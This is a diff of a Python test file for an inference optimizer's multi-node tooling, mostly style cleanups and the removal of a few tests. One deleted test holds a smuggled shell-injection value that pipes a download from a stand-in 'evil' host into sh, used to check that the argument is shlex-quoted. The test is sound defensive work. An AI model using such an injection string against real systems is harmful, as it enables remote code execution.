@@ -43,7 +43,7 @@ def _install_min_ray_stub() -> None:
 
     ray_mod = types.ModuleType("ray")
     ray_mod.init = lambda **kwargs: None
-    ray_mod.nodes = lambda: []
+    ray_mod.nodes = list
     ray_mod.remote = _remote_decorator
     ray_mod.get = lambda ref, timeout=None: ref
 
@@ -130,7 +130,7 @@ def test_resolve_kb_topology_carries_the_partition_mode_into_the_key(monkeypatch
     from hyperloom.inference_optimizer.recipe_snapshot_constants import kb_hardware_slug
 
     _kb_env(monkeypatch, tmp_path, HYPERLOOM_PARTITION_MODE="CPX")
-    monkeypatch.setattr(mne, "_read_state", lambda: {})
+    monkeypatch.setattr(mne, "_read_state", dict)
 
     topo = mne.resolve_kb_topology()
 
@@ -151,7 +151,7 @@ def test_resolve_kb_topology_leaves_the_partition_mode_unset_when_nobody_publish
     from hyperloom.inference_optimizer.recipe_snapshot_constants import kb_hardware_slug
 
     _kb_env(monkeypatch, tmp_path)
-    monkeypatch.setattr(mne, "_read_state", lambda: {})
+    monkeypatch.setattr(mne, "_read_state", dict)
 
     topo = mne.resolve_kb_topology()
 
@@ -384,7 +384,7 @@ def test_kill_remote_dead_pid_stale(tmp_path, monkeypatch):
 
     def _kill(pid, sig):
         if sig == 0:
-            raise ProcessLookupError()
+            raise ProcessLookupError
 
     monkeypatch.setattr("os.kill", _kill)
     out = km._kill_remote(str(d), grace_sec=0)
@@ -403,8 +403,8 @@ def test_kill_remote_sigterms_then_process_exits(tmp_path, monkeypatch):
     def _kill(pid, sig):
         if sig == 0:
             if after_term["done"]:
-                raise ProcessLookupError()
-            return None
+                raise ProcessLookupError
+            return
         assert pid == 4242
 
     def _getpgid(pid):
@@ -609,8 +609,8 @@ def _prep_killable_pid_dir(km, monkeypatch, tmp_path, pid=7777, pgid=770000):
     def _kill(p, sig):
         if sig == 0:
             if state["dead"]:
-                raise ProcessLookupError()
-            return None
+                raise ProcessLookupError
+            return
 
     def _killpg(pg, sig):
         if sig == signal.SIGTERM:
@@ -634,7 +634,7 @@ def test_kill_remote_primary_reclaim_when_footprint_known(monkeypatch, tmp_path)
     def _reclaim(target, slack, timeout):
         calls["primary"] += 1
         assert timeout == 120.0  # primary uses gpu_free_timeout_s default
-        return None
+        return
 
     monkeypatch.setattr(km, "_wait_gpu_reclaimed", _reclaim)
     monkeypatch.setattr(km, "_wait_gpu_free", lambda *a: calls.__setitem__("fallback", calls["fallback"] + 1) or [])
@@ -960,23 +960,6 @@ def test_wait_health_false_on_timeout(monkeypatch):
     assert lm._wait_health(timeout_s=5) is False
 
 
-def test_infera_ssh_port_role_stride_and_idle_entrypoint():
-    from hyperloom.inference_optimizer.multi_node._internal import infera_support
-    from hyperloom.inference_optimizer.multi_node._internal.ssh_client import DEFAULT_SSH_PORT
-
-    assert infera_support.ssh_port_for_pod("prefill", 0) == DEFAULT_SSH_PORT
-    assert infera_support.ssh_port_for_pod("decode", 0) == DEFAULT_SSH_PORT + infera_support.INFERA_SSH_PORT_ROLE_STRIDE
-    assert infera_support.ssh_port_for_pod("prefill", 0, ssh_port_base=2222) == 2222
-    assert infera_support.ssh_port_for_pod("decode", 0, ssh_port_base=2222) == 2232
-    assert infera_support.ssh_port_for_pod("worker", 1, ssh_port_base=2222) == 2223
-    prefill_ep = infera_support.idle_worker_entrypoint(role="prefill", ssh_port_base=2222)
-    decode_ep = infera_support.idle_worker_entrypoint(role="decode", ssh_port_base=2222)
-    assert "2222" in prefill_ep and "LWS_WORKER_INDEX" in prefill_ep
-    assert "2232" in decode_ep
-    default_prefill_ep = infera_support.idle_worker_entrypoint(role="prefill")
-    assert str(DEFAULT_SSH_PORT) in default_prefill_ep
-
-
 def test_infera_disagg_flags_and_launch_args():
     from hyperloom.inference_optimizer.multi_node._internal import infera_support
 
@@ -1028,7 +1011,7 @@ def test_infera_build_node_launch_args_sglang_and_kill_only():
     assert "--model" not in k
 
 
-# Infera kernel ops routing/isolation (apply-patch / kernel-bench / install-geak).
+# Infera kernel ops routing/isolation (apply-patch / install-geak).
 
 
 def test_resolve_geak_src_resolution_order(monkeypatch):
@@ -1074,33 +1057,6 @@ def test_apply_patch_routes_to_infera_only_when_backend_infera(tmp_path, monkeyp
     sp.write_text('{"backend":"rayjob","nodes":2}', encoding="utf-8")
     sp.chmod(0o600)
     assert mn_cli.cmd_apply_patch(ns) == mn_cli.EXIT_CONFIG_ERROR  # legacy path
-
-
-def test_kernel_bench_routes_to_infera_only_when_backend_infera(tmp_path, monkeypatch):
-    from hyperloom.inference_optimizer.multi_node import cli as mn_cli
-
-    sp = tmp_path / "s.json"
-    sp.write_text('{"backend":"infera","nodes":2}', encoding="utf-8")
-    sp.chmod(0o600)
-    monkeypatch.setenv("MULTI_NODE_STATE_FILE", str(sp))
-    monkeypatch.setattr(mn_cli, "_infera_kernel_bench", lambda a: 7777)
-
-    ns = argparse.Namespace(
-        workspace="/w",
-        bench_command="true",
-        files_b64_json="{}",
-        result_glob="*.json",
-        timeout_sec=60,
-        print_logs=False,
-        poll_interval=6,
-        poll_timeout=110,
-    )
-    sp.write_text('{"backend":"infera","nodes":2}', encoding="utf-8")
-    sp.chmod(0o600)
-    assert mn_cli.cmd_kernel_bench(ns) == 7777
-    sp.write_text('{"backend":"rayjob","nodes":2}', encoding="utf-8")
-    sp.chmod(0o600)
-    assert mn_cli.cmd_kernel_bench(ns) == mn_cli.EXIT_CONFIG_ERROR
 
 
 def test_install_geak_best_effort_noop_for_rayjob(tmp_path, monkeypatch):
@@ -1305,7 +1261,9 @@ def test_export_ray_address_to_os(monkeypatch: pytest.MonkeyPatch, tmp_path: Pat
     monkeypatch.setenv("HYPERLOOM_MN_EXT_SERVICE_URL", "http://head:8888")
     monkeypatch.setenv("HYPERLOOM_MN_EXT_HEAD_IP", "10.0.0.5")
     monkeypatch.setenv("INFERENCE_OPTIMIZER_MN_BACKEND", "rayjob")
-    monkeypatch.delenv("RAY_ADDRESS", raising=False)
+    # delenv on an unset name records nothing to undo, so the address the call writes would outlive this test.
+    monkeypatch.setenv("RAY_ADDRESS", "")
+    monkeypatch.delenv("RAY_ADDRESS")
     mne.export_ray_address_to_os()
     assert os.environ.get("RAY_ADDRESS") == "10.0.0.5:6379"
 
@@ -1454,27 +1412,6 @@ def test_infera_build_node_launch_args_rejects_denied_extra_args():
             nnodes=1,
             extra_args="--model-path /evil",
         )
-
-
-def test_multinode_op_args_shlex_quotes_malicious_value():
-    """The Infera SSH op_args builder path (bench) must also shlex-quote."""
-    import shlex
-
-    from hyperloom.inference_optimizer.multi_node import cli as mn_cli
-
-    evil = "x; curl http://evil/p | sh"
-    ns = argparse.Namespace(
-        workspace="/w",
-        bench_command=evil,
-        files_b64_json="{}",
-        result_glob="*.json",
-        timeout_sec=60,
-    )
-    ep = mn_cli._build_multinode_kernel_bench_entrypoint(
-        ns.workspace, ns.bench_command, ns.files_b64_json, ns.result_glob, ns.timeout_sec
-    )
-    assert shlex.quote(evil) in ep
-    assert f"--bench-command {evil}" not in ep
 
 
 def _bootstrap_sh() -> Path:
